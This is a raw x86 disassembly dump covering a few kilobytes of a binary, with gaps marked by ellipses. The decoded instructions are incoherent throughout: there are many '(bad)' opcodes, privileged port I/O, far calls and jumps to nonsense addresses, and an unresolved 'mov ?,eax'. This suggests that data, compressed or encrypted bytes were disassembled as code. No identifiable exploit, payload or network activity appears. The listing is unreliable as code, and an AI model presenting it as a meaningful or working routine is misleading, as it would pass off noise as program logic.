  41e6fd:	push   0x37
  41e6ff:	sub    edx,DWORD PTR [esi+0x71]
  41e702:	hlt    
  41e703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e704:	or     al,0x44
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    eax,0xb7000001
  41e70d:	sbb    DWORD PTR [esi],edx
  41e70f:	aam    0x51
  41e711:	gs (bad) 
  41e713:	mov    ds:0x7be1e952,eax
  41e718:	jg     0x41e6d8
  41e71a:	cmp    ebp,DWORD PTR [ebp+0x71bd1d94]
  41e720:	xor    dl,ah
  41e722:	pop    edi
  41e723:	pop    ebx
  41e724:	imul   ecx,DWORD PTR [esi],0x76a674ef
  41e72a:	fadd   QWORD PTR [ecx]
  41e72c:	cmp    DWORD PTR gs:[ebx],esi
  41e72f:	stos   BYTE PTR es:[edi],al
  41e730:	cs push esp
  41e732:	retf   0x4ae6
  41e735:	jb     0x41e7a6
  41e737:	mov    ebp,0xc5556c8c
  41e73c:	mov    BYTE PTR [ebx+0x31],0x11
  41e740:	mov    dl,0x5
  41e742:	sub    BYTE PTR ss:[eax-0xe],0xe6
  41e747:	dec    ebp
  41e748:	jnp    0x41e6cf
  41e74a:	jg     0x41e7ca
  41e74c:	(bad)
  41e74f:	dec    ecx
  41e750:	in     al,dx
  41e751:	jno    0x41e77d
  41e753:	sbb    eax,0x2515982d
  41e758:	(bad)  
  41e759:	imul   eax,esi,0xffffff9b
  41e75c:	mov    ah,0xc4
  41e75e:	daa    
  41e75f:	aaa    
  41e760:	stos   DWORD PTR es:[edi],eax
  41e761:	add    ch,BYTE PTR [ebx+0x3ccafa5c]
  41e767:	ja     0x41e749
  41e769:	adc    dl,ah
  41e76b:	add    esi,edx
  41e76d:	and    edi,esp
  41e76f:	push   esp
  41e770:	fs out dx,eax
  41e772:	sahf   
  41e773:	into   
  41e774:	in     eax,dx
  41e775:	sahf   
  41e776:	sub    ch,al
  41e778:	stc    
  41e779:	mov    ebp,0x1d7f204b
  41e77e:	sbb    ebx,ebp
  41e780:	mov    ebx,0xa74e9070
  41e785:	lds    edi,FWORD PTR [edi+0x26]
  41e788:	mov    ds:0x516f580a,al
  41e78d:	pop    ds
  41e78e:	pushf  
  41e78f:	ret    0x6b19
  41e792:	ja     0x41e757
  41e794:	pop    edx
  41e795:	inc    ebp
  41e796:	loop   0x41e720
  41e798:	pop    ebp
  41e799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e79a:	inc    esp
  41e79b:	pop    edx
  41e79c:	mov    DWORD PTR [edi],edi
  41e79e:	or     ebp,DWORD PTR [ebp-0x2e]
  41e7a1:	fld    TBYTE PTR [ecx-0x6f0a0fe2]
  41e7a7:	daa    
  41e7a8:	loop   0x41e79e
  41e7aa:	and    al,0x67
  41e7ac:	mov    esi,0x26726d4d
  41e7b1:	pop    esp
  41e7b2:	or     ah,al
  41e7b4:	je     0x41e817
  41e7b6:	in     eax,0x1f
  41e7b8:	not    edi
  41e7ba:	and    al,0x8e
  41e7bc:	push   esp
  41e7bd:	inc    ecx
  41e7be:	fbld   TBYTE PTR [esi+0x56]
  41e7c1:	push   ecx
  41e7c2:	xchg   ebp,eax
  41e7c3:	add    eax,0x1a34755f
  41e7c8:	mov    al,ds:0x5e387117
  41e7cd:	fwait
  41e7ce:	ins    DWORD PTR es:[edi],dx
  41e7cf:	into   
  41e7d0:	xchg   ecx,eax
  41e7d1:	mov    ch,0x4b
  41e7d3:	push   ds
  41e7d4:	mov    al,ds:0xb286405a
  41e7d9:	mov    ds:0x91d6653a,al
  41e7de:	inc    esi
  41e7df:	ja     0x41e784
  41e7e1:	add    DWORD PTR [ecx-0x7f],ecx
  41e7e4:	mov    bh,0xb
  41e7e6:	inc    esi
  41e7e7:	add    DWORD PTR [ebx],edx
  41e7e9:	scas   eax,DWORD PTR es:[edi]
  41e7ea:	loop   0x41e814
  41e7ec:	push   ebp
  41e7ed:	icebp  
  41e7ee:	lahf   
  41e7ef:	or     eax,ebx
  41e7f1:	jp     0x41e842
  41e7f3:	(bad)  
  41e7f4:	popf   
  41e7f5:	mov    al,0xbb
  41e7f7:	push   esi
  41e7f8:	push   ebx
  41e7f9:	inc    esp
  41e7fa:	jl     0x41e7f0
  41e7fc:	adc    BYTE PTR [eax+0x23],bh
  41e7ff:	ret    0x5d28
  41e802:	lahf   
  41e803:	inc    esi
  41e804:	mov    al,ds:0xcb4b5d9c
  41e809:	add    eax,0x3404e49d
  41e80e:	adc    eax,0x5b8d
	...
  41e873:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e88a
  41e881:	test   eax,0x45118f5c
  41e886:	add    DWORD PTR [eax],eax
  41e888:	add    eax,0x7b000001
  41e88d:	(bad)  
  41e88e:	call   0xb3086989
  41e893:	fisub  DWORD PTR [ebx+0xdf0418e]
  41e899:	mov    esi,0xfcb53865
  41e89e:	(bad)  
  41e89f:	jge    0x41e8bd
  41e8a1:	(bad)  
  41e8a2:	dec    edi
  41e8a3:	sub    al,0x4e
  41e8a5:	add    cl,BYTE PTR [edx+0xdbbaf0b]
  41e8ab:	ds ja  0x41e882
  41e8ae:	mov    edi,0xfb2a123c
  41e8b3:	test   eax,0x17db1393
  41e8b8:	je     0x41e880
  41e8ba:	stos   BYTE PTR es:[edi],al
  41e8bb:	rcl    DWORD PTR [ebp+0x3c033fdd],0x33
  41e8c2:	xor    esp,ebx
  41e8c4:	adc    eax,eax
  41e8c6:	xchg   BYTE PTR [ebp+0x1],ah
  41e8c9:	pusha  
  41e8ca:	sbb    eax,0x8a2a1db
  41e8cf:	retf   0xa61b
  41e8d2:	sub    cl,BYTE PTR [ebp+0x3cfc1a89]
  41e8d8:	mov    ebp,0x899655eb
  41e8de:	dec    eax
  41e8df:	xor    al,0x6b
  41e8e1:	pop    ebx
  41e8e2:	addr16 dec esp
  41e8e4:	push   0x5d508c91
  41e8e9:	adc    BYTE PTR [esi],dl
  41e8eb:	inc    esp
  41e8ec:	jne    0x41e8ac
  41e8ee:	or     edi,DWORD PTR [ebx+0x8de7c4a]
  41e8f4:	jb     0x41e8bf
  41e8f6:	fwait
  41e8f7:	lea    ebp,[esi]
  41e8f9:	push   ss
  41e8fa:	jbe    0x41e918
  41e8fc:	pop    edi
  41e8fd:	shl    BYTE PTR [ebx-0x71],1
  41e900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e901:	cs mov eax,0x278c7a4d
  41e907:	adc    al,0x63
  41e909:	mov    ch,0xa6
  41e90b:	stos   DWORD PTR es:[edi],eax
  41e90c:	iret   
  41e90d:	jge    0x41e8fe
  41e90f:	add    eax,0x877ec35a
  41e914:	adc    BYTE PTR [eax-0x2c],bl
  41e917:	mov    bh,0xea
  41e919:	lea    edx,[eax+0x78]
  41e91c:	into   
  41e91d:	xlat   BYTE PTR ds:[ebx]
  41e91e:	outs   dx,DWORD PTR ds:[esi]
  41e91f:	adc    BYTE PTR [eax+esi*8-0x6275bca0],0xed
  41e927:	push   esp
  41e928:	push   esi
  41e929:	jg     0x41e8fb
  41e92b:	out    dx,al
  41e92c:	fistp  DWORD PTR [edx+0x295d7d29]
  41e932:	adc    dl,cl
  41e934:	sub    al,0x30
  41e936:	lds    eax,FWORD PTR [edx+0x78]
  41e939:	dec    ebp
  41e93a:	mov    esi,0x831c77c3
  41e93f:	lods   al,BYTE PTR ds:[esi]
  41e940:	shl    BYTE PTR [edx],1
  41e942:	and    DWORD PTR [esi],esi
  41e944:	dec    esi
  41e945:	or     ebp,DWORD PTR [ebx]
  41e947:	cmp    DWORD PTR [esi-0x62947081],ecx
  41e94d:	ins    DWORD PTR es:[edi],dx
  41e94e:	sbb    cl,BYTE PTR [ebx-0x7cc60d13]
  41e954:	fnsave [ecx-0x31]
  41e957:	mov    al,ds:0xc738d4ba
  41e95c:	daa    
  41e95d:	and    BYTE PTR [edx],bl
  41e95f:	pop    ecx
  41e960:	int    0xab
  41e962:	mov    esp,esp
  41e964:	push   ebp
  41e965:	and    eax,0xe88e63c6
  41e96a:	mov    ch,0x8c
  41e96c:	(bad)  
  41e96d:	cmc    
  41e96e:	mov    dh,0xd7
  41e970:	and    BYTE PTR [esp+ebx*2-0x7b],cl
  41e974:	int    0x47
  41e976:	ins    BYTE PTR es:[edi],dx
  41e977:	lods   al,BYTE PTR ds:[esi]
  41e978:	imul   ebx,DWORD PTR [edx-0x4e],0xffffffca
  41e97c:	je     0x41e942
  41e97e:	cmp    BYTE PTR [ebx+ecx*2-0x54],ah
  41e982:	je     0x41e9be
  41e984:	lea    esp,[edi-0x29ed0ecc]
  41e98a:	dec    ecx
  41e98b:	push   esi
  41e98c:	mov    esp,0x9abc562a
	...
  41e9f1:	add    BYTE PTR [eax],al
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	sahf   
  41ea01:	mov    bh,ah
  41ea03:	(bad)  
  41ea04:	push   ss
  41ea05:	inc    esi
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0x8000001
  41ea0d:	sub    al,0x51
  41ea0f:	push   esi
  41ea10:	outs   dx,BYTE PTR ds:[esi]
  41ea11:	enter  0xa469,0x4e
  41ea15:	cmp    DWORD PTR [eax+0x20542a63],edi
  41ea1b:	jge    0x41e9c6
  41ea1d:	popf   
  41ea1e:	sub    al,0xe
  41ea20:	push   ecx
  41ea21:	sub    dh,BYTE PTR [edi]
  41ea23:	jmp    0xc4e1:0xedd68bdf
  41ea2a:	popf   
  41ea2b:	adc    eax,0xcb604a3f
  41ea30:	inc    esp
  41ea31:	push   ds
  41ea32:	mov    dh,BYTE PTR [edi+0x7e3b6825]
  41ea38:	xor    ebp,DWORD PTR [ecx+0x68]
  41ea3b:	adc    dl,BYTE PTR [eax+0x685f802e]
  41ea41:	test   DWORD PTR [ebx],eax
  41ea43:	sbb    eax,0x60f9b1ce
  41ea48:	and    DWORD PTR [eax],ecx
  41ea4a:	jns    0x41e9e8
  41ea4c:	xchg   ebx,eax
  41ea4d:	jae    0x41ea60
  41ea4f:	push   ds
  41ea50:	or     eax,0x91c6983f
  41ea55:	and    DWORD PTR [ebp+0x47e6e381],eax
  41ea5b:	mov    bh,0x17
  41ea5d:	cwde   
  41ea5e:	mov    dh,0x76
  41ea60:	cwde   
  41ea61:	fsub   st,st(6)
  41ea63:	or     eax,0xc526cd7f
  41ea68:	sbb    ebp,DWORD PTR [edi+0x55]
  41ea6b:	shl    BYTE PTR [edx],0xe2
  41ea6e:	fs int 0x9d
  41ea71:	(bad)  
  41ea73:	mul    dl
  41ea75:	xor    dl,BYTE PTR [edi+0x61]
  41ea78:	fldcw  WORD PTR [esi+0x576fd9ae]
  41ea7f:	jnp    0x41ead9
  41ea81:	push   es
  41ea82:	mov    ebp,0x99e093bd
  41ea87:	leave  
  41ea88:	jo     0x41ea48
  41ea8a:	pushf  
  41ea8b:	test   BYTE PTR [ecx],dh
  41ea8d:	cmc    
  41ea8e:	fisubr DWORD PTR [bp-0x71ca]
  41ea93:	lea    edi,[ebp-0x3cab5e4f]
  41ea99:	adc    al,0xbe
  41ea9b:	push   ebx
  41ea9c:	rcr    bl,0xe1
  41ea9f:	or     DWORD PTR ds:0xb5919c3d,edx
  41eaa5:	test   eax,0x42479e71
  41eaaa:	add    ecx,DWORD PTR [edx+0xed82b2c]
  41eab0:	cli    
  41eab1:	ja     0x41eb0b
  41eab3:	fstp   DWORD PTR [eax]
  41eab5:	test   BYTE PTR [esi],cl
  41eab7:	xor    al,0x89
  41eab9:	jnp    0x41eb39
  41eabb:	scas   al,BYTE PTR es:[edi]
  41eabc:	leave  
  41eabd:	nop
  41eabe:	push   esp
  41eabf:	fidiv  WORD PTR [eax]
  41eac1:	cmp    dl,0x2c
  41eac4:	mov    ch,0x13
  41eac6:	int    0xac
  41eac8:	into   
  41eac9:	std    
  41eaca:	xlat   BYTE PTR ds:[ebx]
  41eacb:	scas   eax,DWORD PTR es:[edi]
  41eacc:	scas   eax,DWORD PTR es:[edi]
  41eacd:	adc    ecx,ecx
  41eacf:	cmp    BYTE PTR [ecx],0x5d
  41ead2:	push   edx
  41ead3:	out    0x66,al
  41ead5:	fist   DWORD PTR [edi]
  41ead7:	jmp    0x41eadb
  41ead9:	pop    ebp
  41eada:	jno    0x41eaba
  41eadc:	sub    BYTE PTR [ebp+ecx*8-0x7],ch
  41eae0:	dec    edi
  41eae1:	xchg   edi,eax
  41eae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eae3:	outs   dx,DWORD PTR ds:[esi]
  41eae4:	inc    sp
  41eae6:	inc    eax
  41eae7:	aam    0xd6
  41eae9:	pushf  
  41eaea:	jne    0x41eb3e
  41eaec:	popf   
  41eaed:	test   BYTE PTR [ecx+0x14a7714],0xdb
  41eaf4:	push   esp
  41eaf5:	test   eax,0x3e91e947
  41eafa:	and    BYTE PTR [ebx-0x52b4beb2],cl
  41eb00:	imul   esp,DWORD PTR [esi+0x17],0x10
  41eb04:	stos   DWORD PTR es:[edi],eax
  41eb05:	fucomip st,st(2)
  41eb07:	sub    DWORD PTR [edi],0x73ddc1a7
  41eb0d:	loope  0x41eb0e
  41eb0f:	cdq    
  41eb10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x57
  41eb81:	jno    0x41eb91
  41eb83:	pop    eax
  41eb84:	sbb    eax,DWORD PTR [edi+0x1]
  41eb87:	add    BYTE PTR ds:0xbe000001,al
  41eb8d:	xor    BYTE PTR [eax],ch
  41eb8f:	mov    edx,DWORD PTR [eax]
  41eb91:	xor    DWORD PTR [esi+0x7d],esi
  41eb94:	jg     0x41eb46
  41eb96:	jbe    0x41ebd7
  41eb98:	shr    DWORD PTR [ebx+0x447caf7b],1
  41eb9e:	sbb    dh,0x78
  41eba1:	mov    esi,0xa8d6418f
  41eba6:	stos   DWORD PTR es:[edi],eax
  41eba7:	dec    ecx
  41eba8:	(bad)  
  41eba9:	pop    esi
  41ebaa:	ficomp DWORD PTR [ebx+0x20d7398f]
  41ebb0:	push   ecx
  41ebb1:	push   ds
  41ebb2:	rcr    DWORD PTR ds:0x7783cf55,0x54
  41ebb9:	inc    ebp
  41ebba:	int3   
  41ebbb:	fdivr  QWORD PTR [ecx+0x30f52376]
  41ebc1:	aas    
  41ebc2:	inc    ebx
  41ebc3:	call   0x3cf:0x42302611
  41ebca:	sar    DWORD PTR [edx],0xb7
  41ebcd:	aaa    
  41ebce:	out    0xf6,eax
  41ebd0:	aam    0x37
  41ebd2:	jl     0x41ebf8
  41ebd4:	iret   
  41ebd5:	mov    dl,0x18
  41ebd7:	xchg   ebx,eax
  41ebd8:	mov    BYTE PTR [ebp-0x45],cl
  41ebdb:	push   ss
  41ebdc:	neg    DWORD PTR [ecx-0x228689b4]
  41ebe2:	sti    
  41ebe3:	mov    edx,0xd8d7c092
  41ebe8:	jbe    0x41eb85
  41ebea:	mov    esp,0xe0c7744c
  41ebef:	(bad)  
  41ebf0:	je     0x41ec13
  41ebf2:	push   eax
  41ebf3:	dec    ebx
  41ebf4:	ja     0x41ebc5
  41ebf6:	mov    ah,0xc6
  41ebf8:	xor    bl,BYTE PTR [ebx+0x28]
  41ebfb:	int    0xb
  41ebfd:	or     bh,BYTE PTR [ebp+0x68532ce3]
  41ec03:	in     eax,dx
  41ec04:	and    eax,DWORD PTR [ecx+0x28eff63]
  41ec0a:	mov    bh,0x9
  41ec0c:	add    eax,DWORD PTR [edi+0x24]
  41ec0f:	and    al,0xff
  41ec11:	push   eax
  41ec12:	vmovsd xmm1,xmm4,xmm7
  41ec16:	ror    DWORD PTR [eax-0x4c],0x9b
  41ec1a:	ins    DWORD PTR es:[edi],dx
  41ec1b:	clc    
  41ec1c:	xor    BYTE PTR [ebp+0x7c],cl
  41ec1f:	dec    edi
  41ec20:	xchg   ebp,eax
  41ec21:	inc    esi
  41ec22:	loopne 0x41eca3
  41ec24:	arpl   dx,bx
  41ec26:	iret   
  41ec27:	sub    al,0xc6
  41ec29:	xchg   ecx,eax
  41ec2a:	inc    eax
  41ec2b:	mov    esp,0xcd87f615
  41ec30:	mov    esp,0xd21d8eb3
  41ec35:	push   es
  41ec36:	jg     0x41ec72
  41ec38:	(bad)  
  41ec39:	xor    BYTE PTR [esi+esi*4],cl
  41ec3c:	push   eax
  41ec3d:	nop
  41ec3e:	sub    edx,DWORD PTR [eax+eiz*2]
  41ec41:	or     DWORD PTR [ecx+0xf62c05e],esp
  41ec47:	jae    0x41ecaa
  41ec49:	or     ebx,DWORD PTR ds:[ecx-0x598fad26]
  41ec50:	test   BYTE PTR [ecx],bh
  41ec52:	arpl   WORD PTR [ecx-0x268bee0f],si
  41ec58:	data16 sub al,0xcf
  41ec5b:	es cmp al,0x31
  41ec5e:	cwde   
  41ec5f:	sbb    al,0x69
  41ec61:	inc    ebx
  41ec62:	mov    esi,0x72c5c389
  41ec67:	mov    ebx,0x269e3d0f
  41ec6c:	add    DWORD PTR [ebp-0x3baabefa],edx
  41ec72:	test   eax,0x26944203
  41ec77:	fnstcw WORD PTR [esi-0x71627c9d]
  41ec7d:	lods   al,BYTE PTR ds:[esi]
  41ec7e:	cli    
  41ec7f:	push   ebp
  41ec80:	fbld   TBYTE PTR [esi+0x5228cb55]
  41ec86:	add    DWORD PTR [ebx-0x7b],edi
  41ec89:	jae    0x41ed02
  41ec8b:	xchg   esi,eax
  41ec8c:	out    0xb2,al
  41ec8e:	mov    bh,0xdc
  41ec90:	ret    0x0
	...
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x78705fd0
  41ed02:	jge    0x41ec89
  41ed04:	and    BYTE PTR [eax+0x1],cl
  41ed07:	add    BYTE PTR ds:0xfa000001,al
  41ed0d:	call   0x45c6:0xf9ae80c2
  41ed14:	sub    DWORD PTR [esi+edx*1],0xfffffff3
  41ed18:	push   ebx
  41ed19:	pop    ecx
  41ed1a:	fprem  
  41ed1c:	pop    esi
  41ed1d:	cmp    eax,0x7c435547
  41ed22:	mov    ?,eax
  41ed24:	fnstsw WORD PTR [eax-0x7f2ac003]
  41ed2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed2b:	mov    al,0xd
  41ed2d:	xor    eax,0xfda4a6b2
  41ed32:	test   eax,0xd18b21a7
  41ed37:	(bad)  
  41ed39:	xchg   ebp,eax
  41ed3a:	test   ebx,ebx
  41ed3c:	test   eax,0x8381a066
  41ed41:	jg     0x41ed07
  41ed43:	sbb    DWORD PTR [edx-0x3efeab21],0xffffff89
  41ed4a:	jp     0x41ed99
  41ed4c:	test   DWORD PTR [edx-0x592ecb1f],esi
  41ed52:	rcr    DWORD PTR [ebp-0x16],0xd0
  41ed56:	test   BYTE PTR [edx+ebx*2],ah
  41ed59:	add    al,0x44
  41ed5b:	jo     0x41edd5
  41ed5d:	cdq    
  41ed5e:	retf   0x1c72
  41ed61:	retf   
  41ed62:	fdivr  st(1),st
  41ed64:	adc    cl,al
  41ed66:	or     al,0x94
  41ed68:	ret    
  41ed69:	sbb    eax,0xfdb9c1de
  41ed6e:	lea    esi,[eax-0x28e4f51c]
  41ed74:	call   0x2fbc2439
  41ed79:	xor    bh,dh
  41ed7b:	iret   
  41ed7c:	loop   0x41ed0c
  41ed7e:	test   BYTE PTR [ecx+0x72],al
  41ed81:	push   cs
  41ed82:	test   BYTE PTR [esi],dl
  41ed84:	hlt    
  41ed85:	mov    al,0x8e
  41ed87:	push   ebp
  41ed88:	xchg   esp,eax
  41ed89:	aaa    
  41ed8a:	aad    0x81
  41ed8c:	ins    BYTE PTR es:[edi],dx
  41ed8d:	fdiv   st,st(4)
  41ed8f:	or     esi,0x8
  41ed92:	or     al,0x7c
  41ed94:	jge    0x41ed9e
  41ed96:	jbe    0x41edb1
  41ed98:	test   al,0xb5
  41ed9a:	sbb    eax,0x5ebe8956
  41ed9f:	fdiv   st(2),st
  41eda1:	or     al,0x70
  41eda3:	not    BYTE PTR [ecx]
  41eda5:	aas    
  41eda6:	push   0x24404b6a
  41edab:	lock fisubr DWORD PTR [ebx]
  41edae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edaf:	pop    esp
  41edb0:	push   esp
  41edb1:	push   cs
  41edb2:	loopne 0x41ed48
  41edb4:	push   ss
  41edb5:	push   0xffffffd7
  41edb7:	sbb    BYTE PTR [ebp+0x89b8f92],al
  41edbd:	rcr    BYTE PTR fs:[esi+0x1c4d4b0b],cl
  41edc4:	jmp    0xe660a1af
  41edc9:	stc    
  41edca:	ja     0x41ee2e
  41edcc:	pop    ecx
  41edcd:	cli    
  41edce:	rol    BYTE PTR [eax+0x4],cl
  41edd1:	mov    ds:0x2029e452,al
  41edd6:	push   ecx
  41edd7:	xchg   BYTE PTR [ebp-0x4297885c],bl
  41eddd:	aaa    
  41edde:	fdivr  DWORD PTR [esi+0x414c80a2]
  41ede4:	mov    ah,0x94
  41ede6:	aad    0xe5
  41ede8:	loope  0x41ed88
  41edea:	inc    esi
  41edeb:	push   cs
  41edec:	mov    BYTE PTR [ecx+0x6ad597a4],al
  41edf2:	outs   dx,DWORD PTR ds:[esi]
  41edf3:	xchg   edx,esp
  41edf5:	ja     0x41ede1
  41edf7:	add    edx,DWORD PTR [eax-0x2a12e947]
  41edfd:	loope  0x41ee6c
  41edff:	and    eax,0xecd01a61
  41ee04:	(bad)  
  41ee05:	mov    eax,0x66752b07
  41ee0a:	jo     0x41ee1b
  41ee0c:	mov    al,0xb9
  41ee0e:	retf   
  41ee0f:	into   
  41ee10:	and    eax,0x0
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x25a3:0x8ccb30e7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0x1a000001
  41ee8d:	pushf  
  41ee8e:	dec    esi
  41ee8f:	in     eax,dx
  41ee90:	fisttp QWORD PTR [ebx]
  41ee92:	xchg   esi,eax
  41ee93:	popf   
  41ee94:	hlt    
  41ee95:	loopne 0x41eedb
  41ee97:	or     al,0x39
  41ee99:	ds lahf 
  41ee9b:	and    dl,BYTE PTR [ebp-0x3eb8b115]
  41eea1:	jp     0x41ef0c
  41eea3:	or     bl,BYTE PTR [ecx+0x6b4e6a86]
  41eea9:	xchg   BYTE PTR [edx-0x617bfce0],ch
  41eeaf:	je     0x41ee9e
  41eeb1:	mov    dl,0x9a
  41eeb3:	or     ah,bl
  41eeb5:	mov    dh,0x93
  41eeb7:	sti    
  41eeb8:	mov    bh,0x0
  41eeba:	stos   DWORD PTR es:[edi],eax
  41eebb:	dec    esi
  41eebc:	and    ecx,DWORD PTR [ebp+ebx*1-0x28c7d248]
  41eec3:	jge    0x41eeb3
  41eec5:	leave  
  41eec6:	mov    ah,0xab
  41eec8:	push   eax
  41eec9:	ja     0x41ee59
  41eecb:	mov    ds:0x62a5685e,al
  41eed0:	sub    ebx,DWORD PTR [ecx]
  41eed2:	xchg   BYTE PTR [eax+0x47],ch
  41eed5:	mov    eax,0xa4a232ad
  41eedb:	lock scas eax,DWORD PTR es:[edi]
  41eedd:	aaa    
  41eede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eedf:	push   es
  41eee0:	(bad)  
  41eee1:	pushf  
  41eee2:	shl    BYTE PTR [edx+0x393d500a],1
  41eee8:	or     bh,al
  41eeea:	cs cmc 
  41eeec:	sub    DWORD PTR [ebp-0x65],edx
  41eeef:	sbb    al,0x78
  41eef1:	fld    DWORD PTR [ebp+0x7832acb8]
  41eef7:	out    0x76,al
  41eef9:	sbb    DWORD PTR [ecx-0x12],ecx
  41eefc:	pop    edx
  41eefd:	jo     0x41ef2a
  41eeff:	enter  0x3424,0x85
  41ef03:	xor    dl,0x56
  41ef06:	fld    DWORD PTR [edx+0x3bbbefe1]
  41ef0c:	cwde   
  41ef0d:	xor    BYTE PTR [eax+0x4a],dl
  41ef10:	dec    eax
  41ef12:	dec    ecx
  41ef13:	xchg   DWORD PTR ds:0x7893ff0f,ebp
  41ef19:	pop    edi
  41ef1a:	in     eax,0xe6
  41ef1c:	dec    edi
  41ef1d:	(bad)  
  41ef1e:	push   ds
  41ef1f:	mov    edi,0xe1895662
  41ef24:	(bad)  
  41ef25:	(bad)  
  41ef27:	mov    ebx,edi
  41ef29:	push   ecx
  41ef2a:	inc    esp
  41ef2b:	push   ss
  41ef2c:	test   eax,0x6f14967f
  41ef31:	sub    BYTE PTR [esi],bh
  41ef33:	stos   BYTE PTR es:[edi],al
  41ef34:	lds    ebx,FWORD PTR [edi+0x4b]
  41ef37:	or     ecx,ebx
  41ef39:	jnp    0x41efb8
  41ef3b:	call   0x7a751970
  41ef40:	jo     0x41ef34
  41ef42:	stc    
  41ef43:	pop    ds
  41ef44:	jecxz  0x41efa7
  41ef46:	inc    esi
  41ef47:	pop    ds
  41ef48:	add    BYTE PTR [eax+0x6e824b5],al
  41ef4e:	inc    edx
  41ef4f:	shl    DWORD PTR [edi],cl
  41ef51:	push   ds
  41ef52:	ud1    ebx,DWORD PTR [esi+0x22848ba6]
  41ef59:	sbb    ch,BYTE PTR [eax]
  41ef5b:	add    BYTE PTR [edi],0xa2
  41ef5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef5f:	and    esp,DWORD PTR [edx]
  41ef61:	pop    eax
  41ef62:	retf   
  41ef63:	jp     0x41efbe
  41ef65:	loope  0x41ef17
  41ef67:	nop
  41ef68:	cmp    eax,0xdf6d6445
  41ef6d:	lahf   
  41ef6e:	xchg   edi,eax
  41ef6f:	and    eax,0xfee945c2
  41ef74:	sub    edx,esi
  41ef76:	nop
  41ef77:	ins    BYTE PTR es:[edi],dx
  41ef78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef79:	jle    0x41efb3
  41ef7b:	fldenv [edx+ecx*8]
  41ef7e:	mov    cl,0x6c
  41ef80:	sbb    eax,0xda802f56
  41ef85:	retf   0xcbe3
  41ef88:	scas   al,BYTE PTR es:[edi]
  41ef89:	mov    bh,0xd1
  41ef8b:	jbe    0x41ef27
  41ef8d:	and    eax,0x376434
	...
  41eff2:	add    BYTE PTR [eax],al
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul esp,edi,0x79
  41f002:	in     eax,dx
  41f003:	and    al,0x2a
  41f005:	dec    edx
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    eax,0xdf000001
  41f00d:	rol    BYTE PTR [ebp-0x29dd71c0],0x80
  41f014:	fisttp WORD PTR [eax+0x78]
  41f017:	xchg   esi,eax
  41f018:	add    bl,ch
  41f01a:	je     0x41f04b
  41f01c:	(bad)  
  41f01d:	mov    bh,0x9
  41f01f:	jbe    0x41f030
  41f021:	mov    ch,0xb7
  41f023:	jns    0x41f02a
  41f025:	jno    0x41efe2
  41f027:	seta   bl
  41f02a:	les    esi,FWORD PTR [eax]
  41f02c:	jbe    0x41f028
  41f02e:	(bad)  
  41f02f:	mov    bl,0x7e
  41f031:	and    DWORD PTR [esi+0x2090c69c],ecx
  41f037:	mov    esp,0xf6f1d06a
  41f03c:	rcl    dh,0x4a
  41f03f:	mov    edx,0x57fc13c6
  41f044:	adc    edx,esi
  41f046:	repz rcr DWORD PTR [eax+0x49],1
  41f04a:	(bad)  
  41f04b:	adc    ebx,DWORD PTR [esi]
  41f04d:	jl     0x41f033
  41f04f:	sbb    al,0x8e
  41f051:	mov    bl,BYTE PTR [edx+edi*2+0x221f2e8f]
  41f058:	jl     0x41f05e
  41f05a:	dec    eax
  41f05b:	dec    ebx
  41f05c:	sub    BYTE PTR [ebp-0x35f39697],ch
  41f062:	xor    DWORD PTR [eax+0x2c23e226],ebx
  41f068:	push   esi
  41f069:	push   esi
  41f06a:	xor    dh,BYTE PTR ds:0xe1baecd1
  41f070:	push   ebx
  41f071:	fld    QWORD PTR [ecx]
  41f073:	pop    ss
  41f074:	cmp    DWORD PTR [ebp+0x4e],0xb0c9b839
  41f07b:	cli    
  41f07c:	lahf   
  41f07d:	mov    cl,0xf6
  41f07f:	adc    dh,0xcb
  41f082:	es pop esi
  41f084:	mov    ebx,0x21879584
  41f089:	dec    eax
  41f08a:	sbb    DWORD PTR [ebp-0x5c],edi
  41f08d:	push   ecx
  41f08e:	sbb    esp,esi
  41f090:	enter  0x218d,0x8f
  41f094:	dec    eax
  41f095:	sub    bl,BYTE PTR [ecx]
  41f097:	push   ss
  41f098:	mov    al,0xbb
  41f09a:	jno    0x41f054
  41f09c:	mov    al,ds:0xe3f73c46
  41f0a1:	dec    edx
  41f0a2:	xchg   ebx,eax
  41f0a3:	ror    DWORD PTR [esi+0x42],0xd0
  41f0a7:	push   es
  41f0a8:	push   ebp
  41f0a9:	mov    WORD PTR [ecx-0x65d87c21],gs
  41f0af:	lock int3 
  41f0b1:	mov    al,ds:0xa9864526
  41f0b6:	sub    al,0x3e
